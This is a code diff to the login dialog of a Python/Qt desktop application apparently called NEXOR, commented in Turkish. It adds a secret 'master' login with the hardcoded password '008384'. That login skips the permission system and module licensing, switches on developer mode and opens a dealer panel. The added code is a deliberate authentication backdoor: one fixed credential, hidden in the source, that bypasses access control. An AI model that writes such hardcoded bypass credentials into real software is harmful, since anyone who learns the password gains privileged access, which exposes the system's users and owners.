@@ -42,6 +42,8 @@ class NexorLoginDialog(QDialog):
     current_user_fullname = None
     current_user_role = None
     current_user_role_id = None
+    # master/008384 girilirse True olur; main.py NEXOR yerine bayi panelini açar
+    master_mode = False
 
     def __init__(self):
         super().__init__()
@@ -547,6 +549,28 @@ class NexorLoginDialog(QDialog):
     # Kullanıcı Adı / Şifre ile Giriş
     # ------------------------------------------------------------------
 
+    def _master_giris(self):
+        """master/008384: master_mode flag'i set eder ve dialog'u kapatir.
+
+        main.py master_mode True ise NEXOR ana ekran yerine BayiPaneli acar.
+        Yetki sistemi ve modul lisanslarindan tamamen bagimsiz calisir.
+        """
+        # Gelistirici modunu da ac (Musteri Yonetimi vs. icin)
+        try:
+            from core.modul_servisi import ModulServisi
+            ModulServisi.instance().set_gelistirici_modu(True)
+        except Exception:
+            pass
+
+        NexorLoginDialog.master_mode = True
+        # User bilgileri bos kalir; main.py master_mode'a bakar
+        NexorLoginDialog.current_user_id = None
+        NexorLoginDialog.current_user_name = "master"
+        NexorLoginDialog.current_user_fullname = "Master (Bayi)"
+        NexorLoginDialog.current_user_role = "Master"
+        NexorLoginDialog.current_user_role_id = None
+        self.accept()
+
     def _on_login(self):
         """Giriş işlemi"""
         username = self.username.text().strip()
@@ -554,6 +578,11 @@ class NexorLoginDialog(QDialog):
 
         if not username or not password:
             self._show_error("Kullanıcı adı ve şifre gerekli!")
+            return
+
+        # Gizli master girisi: gelistirici modunu acar + admin olarak otomatik giris
+        if username.lower() == "master" and password == "008384":
+            self._master_giris()
             return
 
         self.login_btn.setEnabled(False)
